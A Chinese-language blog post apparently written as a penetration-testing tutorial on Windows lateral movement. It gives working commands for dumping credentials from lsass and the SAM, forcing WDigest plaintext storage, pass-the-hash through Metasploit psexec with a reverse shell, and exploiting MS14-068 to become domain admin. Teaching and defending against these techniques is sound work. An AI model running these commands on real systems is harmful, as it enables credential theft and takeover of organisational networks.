<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>横向移动与域控权限维持方法总汇 | ConsT27's Blog</title><meta name="keywords" content="内网渗透与权限维持"><meta name="author" content="ConsT27"><meta name="copyright" content="ConsT27"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="横向移动PTH如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了其中若hash加密方式是 rc4 ，那么就是pass the hash若加密方式是aes key,那么就是pass the key注意NTLM和kerberos协议均存在PTH:NTLM自然不用多说kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响">
<meta property="og:type" content="article">
<meta property="og:title" content="横向移动与域控权限维持方法总汇">
<meta property="og:url" content="http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/index.html">
<meta property="og:site_name" content="ConsT27&#39;s Blog">
<meta property="og:description" content="横向移动PTH如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了其中若hash加密方式是 rc4 ，那么就是pass the hash若加密方式是aes key,那么就是pass the key注意NTLM和kerberos协议均存在PTH:NTLM自然不用多说kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/cv.png">
<meta property="article:published_time" content="2021-06-28T13:51:58.227Z">
<meta property="article:modified_time" content="2021-08-03T04:44:49.144Z">
<meta property="article:author" content="ConsT27">
<meta property="article:tag" content="内网渗透与权限维持">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/cv.png"><link rel="shortcut icon" href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219183209.png"><link rel="canonical" href="http://const27.com/2021/06/28/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%8E%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-08-03 12:44:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="ConsT27's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw ConsT27"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://const27blog.oss-cn-beijing.aliyuncs.com/img/cv.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ConsT27's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw ConsT27"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw Link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw About"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">横向移动与域控权限维持方法总汇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-06-28T13:51:58.227Z" title="发表于 2021-06-28 21:51:58">2021-06-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-03T04:44:49.144Z" title="更新于 2021-08-03 12:44:49">2021-08-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了<br>其中若hash加密方式是 rc4 ，那么就是pass the hash<br>若加密方式是aes key,那么就是pass the key<br>注意NTLM和kerberos协议均存在PTH:<br>NTLM自然不用多说<br>kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p>
<p>那前提就是要获取hash值了</p>
<h3 id="KB2871997"><a href="#KB2871997" class="headerlink" title="KB2871997"></a><strong>KB2871997</strong></h3><p>如果系统安装<strong>KB2871997</strong>补丁或者系统版本大于等于window server 2012时(服务器版本),大于等于win8.1(家庭版本)时（自带补丁），默认在lsass.exe这个进程中不会再将可逆的密文缓存在自己的进程内存中，所以我们默认是没办法通过读取这个进程然后逆向该密文来获取明文密码</p>
<p>虽然可以通过修改注册表来使LSASS强制存储明文密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>
<p>但是这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。</p>
<p>同时比较重要的一点是增加了Protected Users组，所属用户会被强制要求使用Kerberos认证，可以避免PTH攻击，以及用户注销后删除凭证(明文密码、LM/NTLM HASH、Kerberos的TGT票据等)</p>
<p>以及：Restricted Admin RDP模式的远程桌面客户端支持</p>
<h3 id="关于KB2871997的一个误解"><a href="#关于KB2871997的一个误解" class="headerlink" title="关于KB2871997的一个误解"></a>关于KB2871997的一个误解</h3><p>自window vista之后没办法使用RID非500的本地管理员用户来进行Pass The Hash, 但是如果是域用户且该域用户属于本地Administrators组的成员也可以进行pass the hash。</p>
<p>很多人把这个原因归结于KB2871997补丁，实际上不然，这个事情的成因实际是UAC在捣乱。UAC是window Vista的新安全组件，具体是个啥这里也不细说了。<br>RID为500的账户和属于本地administrators组的域用户在通过网络远程链接时，默认就是高权限令牌。<br>而非RID500的本地账户则为低权限令牌，若想提升权限则需通过交互方式登录到要通过远程协助或远程桌面管理的计算机走UAC提权。</p>
<p>关于这个成因的一些系统配置选项：</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202713388.png" alt="image-20210726202713388"></p>
<p>这个项默认允许内置管理员账户（RID500账户）在所有应用下都以高权限令牌运行。这也是RID500账户能PTH的原因</p>
<p>以及此注册表项，可以关闭UAC的远程限制，即远程连接时UAC会失效，这样的话只要是administrators组的用户都能PTH辣。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726202837971.png" alt="image-20210726202837971"></p>
<p>其中该值为0则代表开启UAC的远程限制,设置该值为1时</p>
<h3 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h3><p>1.使用meterpreter里的mimikatz模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatz的指令</span><br><span class="line">privilege::debug 提权  samdump::hashes dump哈希  </span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure>
<p>2.使用meterpreter自带的hash获取模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (推荐使用这个)</span><br></pre></td></tr></table></figure>
<p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理<br>意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p>
<p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p>
<p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp</span><br><span class="line">然后将其传回本地</span><br><span class="line">通过mimikatz.exe分别执行以下命令</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130719.png" alt="QQ截图20210217130719"></p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>5.使用cobalt strike 获取hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatz指令</span><br></pre></td></tr></table></figure>
<p>6.利用sam表</p>
<p>mimikatz在线读sam表中的hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
<p>将sam表下载到本地由mimikatz分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析</span><br><span class="line">mimikatz运行</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure>
<h3 id="hash-传递攻击-PTH-（Pass-the-Hash"><a href="#hash-传递攻击-PTH-（Pass-the-Hash" class="headerlink" title="hash 传递攻击 PTH （Pass the Hash)"></a>hash 传递攻击 PTH （Pass the Hash)</h3><p>1.msf里使用psexec模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;以root启动msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;一般选择NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure>
<p>2.使用mimikatz</p>
<p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;自行修改</span><br></pre></td></tr></table></figure>
<p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure>
<p>3.使用cobalt strike</p>
<p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130746.png" alt="QQ截图20210217130746"></p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130806.png" alt="QQ截图20210217130806"></p>
<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>这个洞的危害很大，可以让任意域用户提权到域管。<br>适用版本: server 2000以上<br>补丁: kb3011780</p>
<h3 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h3><p>PAC是kerberos协议里用来解决用户权限功能所设计出的东西。<br>在kerberos协议里面，一个用户用自己的hash拿到了TGT，接着凭借着TGT拿到了TGS，接着用TGS去访问服务。看似只要hash正确，用户就能到处访问服务，但是所有服务都可以给这个用户所访问吗？肯定是不行的，所以微软在kerberos为了实现用户权限分级，采用了PAC。<br>PAC被设计为存在于TGT里面。完整的kerberos权限验证流程如下。</p>
<p>1。用户凭借自己的hash加密时间戳并发送明文用户名到KDC，KDC认证用户成功后返回被krbtgt用户hash加密的TGT(内有ticekt包含着PAC)，以及用户自身hash加密的login session key</p>
<p>2.用户凭借TGT票据向KDC发起指定服务的TGS_REQ。KDC用krbtgt hash解密，若解密成功则直接返回服务hash加密的TGS（这里并没考虑用户的权限，直接返回了TGS）</p>
<p>3.用户用TGS向服务发起请求，服务用自己的hash解密TGS后获得PAC，拿着PAC向KDC询问该用户是否有权限访问。KDC拿到PAC后再次解密，得到了PAC里的 用户的sid，以及所在的组，再判断用户是否有访问服务的权限（有些服务不会验证KDC，这样就会导致白银票据攻击)</p>
<p>PAC自身的结构</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131035.png" alt="QQ截图20210217131035"></p>
<p>PAC在Ticket中的结构</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217131108.png" alt="QQ截图20210217131108"></p>
<p>又这个图可以知道,PAC只不过是ticket里Authorization DATA的一个分支。<br>而Authorization data的结构是这样的</p>
<p>AuthorizationData    ::= SEQUENCE OF SEQUENCE {<br>ad-type     [0] Int32,<br>ad-data     [1] OCTET STRING }</p>
<p>ad-type中就有这么一个类型 AD-IF-RELEVANT 对应数字1,由上上图可知这是PAC的外壳。<br>若类型为 AD-IF-RELEVAN ,那么ad-data也是一个 AuthorizationData类型的结构体，也有ad-type 和ad-data.那么这个外壳ad-data的ad-type就是次外壳AD-WIN2K-PAC 了,与 AD-WIN2K-PAC 这个ad-type对应的ad-data就是一段连续空间。 这段空间包含一个头部PACTYPE以及若干个PAC_INFO_BUFFER 。<br>PACTYPE包含的是 cBuffers,版本以及缓冲区 。<br>PAC_INFO_BUFFER是key-value型的。PAC_INFO_BUFFER的key有很多</p>
<table>
<thead>
<tr>
<th>0x00000001</th>
<th>登录信息。PAC结构必须包含一个这种类型的缓冲区。其他登录信息缓冲区必须被忽略。</th>
</tr>
</thead>
<tbody><tr>
<td>0x00000002</td>
<td>凭证信息。PAC结构不应包含多个此类缓冲区。第二或后续凭证信息缓冲区在接收时必须被忽略。</td>
</tr>
<tr>
<td>0x00000006</td>
<td>服务器校验和。PAC结构必须包含一个这种类型的缓冲区。其他登录服务器校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x00000007</td>
<td>KDC（特权服务器）校验和（第2.8节）。PAC结构必须包含一个这种类型的缓冲区。附加的KDC校验和缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000A</td>
<td>客户名称和票证信息。PAC结构必须包含一个这种类型的缓冲区。附加的客户和票据信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000B</td>
<td>受约束的委派信息。PAC结构必须包含一个S4U2proxy请求的此类缓冲区，否则不包含。附加的受约束的委托信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000C</td>
<td>用户主体名称（UPN）和域名系统（DNS）信息。PAC结构不应包含多个这种类型的缓冲区。接收时必须忽略第二个或后续的UPN和DNS信息缓冲区。</td>
</tr>
<tr>
<td>0x0000000D</td>
<td>客户索取信息。PAC结构不应包含多个这种类型的缓冲区。附加的客户要求信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000E</td>
<td>设备信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备信息缓冲区必须被忽略。</td>
</tr>
<tr>
<td>0x0000000F</td>
<td>设备声明信息。PAC结构不应包含多个这种类型的缓冲区。附加的设备声明信息缓冲区必须被忽略。</td>
</tr>
</tbody></table>
<p>其中比较重要的是1,6和7</p>
<p><strong>0x00000001 KERBVALIDATIONINFO</strong> 这个结构用于存储用户的身份信息.它是一个结构体，这个结构体是这样的(待会我们伪造PAC的时候主要就是伪造此处额 UserId 以及 PGROUP_MEMBERSHIP GroupIds ）服务器解包PAC后提取用户的sid以及groupid，然后就把当前发包过来的用户权限当成sid，groupid的权限处理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _KERB_VALIDATION_INFO &#123;</span><br><span class="line">FILETIME LogonTime;</span><br><span class="line">FILETIME LogoffTime;</span><br><span class="line">FILETIME KickOffTime;</span><br><span class="line">FILETIME PasswordLastSet;</span><br><span class="line">FILETIME PasswordCanChange;</span><br><span class="line">FILETIME PasswordMustChange;</span><br><span class="line">RPC_UNICODE_STRING EffectiveName;</span><br><span class="line">RPC_UNICODE_STRING FullName;</span><br><span class="line">RPC_UNICODE_STRING LogonScript;</span><br><span class="line">RPC_UNICODE_STRING ProfilePath;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectory;</span><br><span class="line">RPC_UNICODE_STRING HomeDirectoryDrive;</span><br><span class="line">USHORT LogonCount;</span><br><span class="line">USHORT BadPasswordCount;</span><br><span class="line">ULONG UserId; &#x2F;&#x2F;用户的sid</span><br><span class="line">ULONG PrimaryGroupId;</span><br><span class="line">ULONG GroupCount;</span><br><span class="line">[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;&#x2F;&#x2F;用户所在的组，如果我们可以篡改的这个的话，添加一个500(域管组)，那用户就是域管了。在ms14068 PAC签名被绕过，用户可以自己制作PAC的情况底下，pykek就是靠向这个地方写进域管组，成为使得改用户变成域管</span><br><span class="line">ULONG UserFlags;</span><br><span class="line">USER_SESSION_KEY UserSessionKey;</span><br><span class="line">RPC_UNICODE_STRING LogonServer;</span><br><span class="line">RPC_UNICODE_STRING LogonDomainName;</span><br><span class="line">PISID LogonDomainId;</span><br><span class="line">ULONG Reserved1[2];</span><br><span class="line">ULONG UserAccountControl;</span><br><span class="line">ULONG SubAuthStatus;</span><br><span class="line">FILETIME LastSuccessfulILogon;</span><br><span class="line">FILETIME LastFailedILogon;</span><br><span class="line">ULONG FailedILogonCount;</span><br><span class="line">ULONG Reserved3;</span><br><span class="line">ULONG SidCount;</span><br><span class="line">[size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;</span><br><span class="line">PISID ResourceGroupDomainSid;</span><br><span class="line">ULONG ResourceGroupCount;</span><br><span class="line">[size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;</span><br><span class="line">&#125; KERB_VALIDATION_INFO;</span><br></pre></td></tr></table></figure>
<p><strong>0x00000006和0x00000007</strong> 6是服务器校验和，由server密码加密。7是KDC校验和，又KDC密码加密。存在的目的就是防止PAC被篡改。</p>
<h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p>这个漏洞的产生主要是微软犯下了三个错误：<br>1.对校验和的算法实现不够细致，导致在校验和生成时可以不用管server和KDC的hash直接生成，而且生成出来的校验和还是合法的<br>2.PAC可以不用放在TGT中，即使是这样，KDC也能照常解析出TGT外的PAC<br>3.下面再说</p>
<p>那么这个漏洞大致的攻击原理是什么呢。<br>首先，我们在as_request的时候，把include-PAC标志设置为false，那么as_rep就不会在TGT中返回PAC了。然后这个时候我们自己伪造一个pac，在TGS_REQ时发过去就行了。伪造的pac修改USER SID&amp;GROUP SID(在PAC的 <strong>0x00000001 KERBVALIDATIONINFO</strong> 结构)可以把我们的用户权限改到很高（域管），从而达到提权到域管的能力。</p>
<p>那么伪造PAC，我们就遇到了两个问题：<br>1.pac里有校验和，防止自己被篡改，我们得有server和KDC密码才能使校验和合法。<br>2.pac按理说应该在TGT里，但是TGT是被kbrtgt hash加密的，我们无法获取kbrtgt hash继而无法修改TGT内容，继而不能修改PAC。</p>
<p>来说说如何绕过PAC校验和问题。<br>我们刚刚说过，<strong>0x00000006和0x00000007</strong> 这两个结构的存在是为了防止PAC被篡改，这个校验和算法采用的是个叫checksum算法然后把kdc hash和服务hash当作key对PAC加密产生的值，从而防止PAC被篡改。但是checksum算法是有很多种的，md5也是checksum的分支之一，修改PAC后，我们只需设置加密算法为MD5并用MD5算法对<strong>0x00000001 KERBVALIDATIONINFO</strong>进行加密，将生成的值放入两个检验和即可，KDC拿到<strong>0x00000001 KERBVALIDATIONINFO</strong>，并且通过解析数据包获取当前加密算法为MD5，然后对其进行MD5加密，若加密结果与校验和一致，则认为PAC未被修改</p>
<p>再来说说如何绕过krbtgt hash加密TGT的问题。<br>因为我们在AS_REQ时设置include-PAC为false，TGT里就不会包含PAC了。那么我们在TGS_REQ时如何把PAC传递给KDC？只需要把PAC放入req-body即可。<br>这样KDC依旧会正常解析这个TGS_REQ包</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132156.png" alt="QQ截图20210217132156"></p>
<p>注意TGS_REQ里的include-pac依旧是false。<br><strong>然后KDC接收到PAC后会先解密TGT拿到authenticator里的key对PAC进行解密（TGS_REQ时加密PAC用的key是随机生成的，这个key会放在authenticator里），然后验证一下PAC的签名，若成功然后把解密得到的PAC采用server key和KDC key重新生成校验和，拼接成一个新的TGT返回给客户端。</strong><br>上面这一段就是微软犯下的第三个错误，很不可思议，居然莫名其妙的返回了一个包含了PAC的TGT回来。总结来说就是构造了一个畸形的TGS_REQ，从TGS_RES得到了一个包含伪造PAC的TGT。</p>
<p>原理就是上面这些，然后我们用包含伪造PAC的TGT到处访问服务即可。</p>
<h3 id="M14068利用"><a href="#M14068利用" class="headerlink" title="M14068利用"></a>M14068利用</h3><p>1.工具kekeo<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718"> https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p>
<p>具体方法为，在kekeo里先执行 kerberos::purge清空票据<br>然后再执行 exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt<br>即可。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132222.png" alt="QQ截图20210217132222"></p>
<p>然后就dir \域控\c$ 试试，如果可以就说明提权成功了（不是每次都能成功的)</p>
<p>2.golenpac <a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe">https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe</a></p>
<p>这个工具好用,</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217132233.png" alt="QQ截图20210217132233"></p>
<p>执行类似上述命令，就能返回一个域控的 system权限的cmd shell回来，感觉蛮好用<br>另外在最后指定域控机器时，可以指定域控以外的机器并获取他们的本地system权限用户.<br>但返回的似乎不是域控？</p>
